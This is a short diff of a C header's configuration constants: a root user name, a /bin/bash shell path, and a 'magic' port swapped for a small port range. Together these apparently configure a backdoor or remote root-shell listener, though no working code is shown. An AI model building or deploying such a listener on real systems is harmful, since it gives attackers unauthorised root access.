@@ -3,7 +3,8 @@
 #define JACK_USER "root"
 
 /* Socket definitions. */
-#define MAGIC_PORT 5914
+#define LOW_PORT  61
+#define HIGH_PORT 65
 
 /* Miscellaneous. */
 #define SHELL_PATH "/bin/bash"
